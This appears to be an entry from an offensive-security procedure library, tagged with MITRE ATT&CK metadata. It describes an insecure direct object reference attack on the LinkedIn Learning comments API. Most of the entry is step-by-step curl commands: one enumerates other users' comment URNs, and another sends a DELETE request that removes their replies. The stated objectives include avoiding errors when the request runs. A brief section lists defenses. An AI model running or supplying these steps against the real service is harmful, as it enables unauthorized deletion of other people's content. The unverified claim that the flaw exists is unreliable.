---
tags:
  - access-control-bypass
  - idor
  - api
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/curl-modify-urn]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2024-01-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:32:29.105Z'
skill_level: intermediate
impact_level: medium
detection_risk: medium
sub_techniques: []
id: 630b3177-1d2d-4d82-b7ca-47b65b62df9c
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Manipulate-Comment-URN-for-Deletion

## Summary

This procedure modifies the comment URN parameter in a LinkedIn Learning API deletion request to target replies owned by other users, exploiting the lack of ownership validation.

## Description

With an authenticated session, the attacker captures a legitimate comment deletion request and alters the URN (e.g., from `urn:li:comment:own_id` to `urn:li:comment:target_id`) obtained from the Q&A thread. This bypasses server-side checks that should verify user ownership, allowing preparation for unauthorized deletion. The target environment is the web-based LinkedIn Learning API, requiring no additional privileges beyond basic authentication.

## Requirements

1. Captured legitimate deletion request from Step 1
2. URN of a target comment from another user
3. Valid access token for API authentication

## Defense

Defensive measures and detection strategies:

- Validate ownership by comparing user ID in token with comment owner
- Sanitize and log URN parameters for anomalies
- Implement server-side checks for cross-user actions

## Objectives

1. Alter URN to reference unauthorized comment
2. Validate modified request syntax
3. Set up for execution without triggering errors

## Instructions

### Step 1: Extract Target URN

**Context**: Identify the URN of another user's comment reply in the same Q&A thread.

**Command** ([[commands/curl-modify-urn]]):
```bash
# Inspect via GET to fetch comments
curl -X GET 'https://api.linkedin.com/learning/comments?thread_id={thread_id}' \
  -H 'Authorization: Bearer {token}'
```

> Parse the response JSON to extract URNs, selecting one not owned by the current user.

### Step 2: Modify the Request

**Context**: Replace the URN in the captured deletion request.

**Command** ([[commands/curl-modify-urn]]):
```bash
curl -X DELETE 'https://api.linkedin.com/learning/comments/{target_urn}' \
  -H 'Authorization: Bearer {token}'
```

> Update the path with the new URN and test the request in a tool like Postman before full execution.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/curl-modify-urn]]

## Tools Used


## Tags

- [[access-control-bypass]]
- [[idor]]
- [[api]]
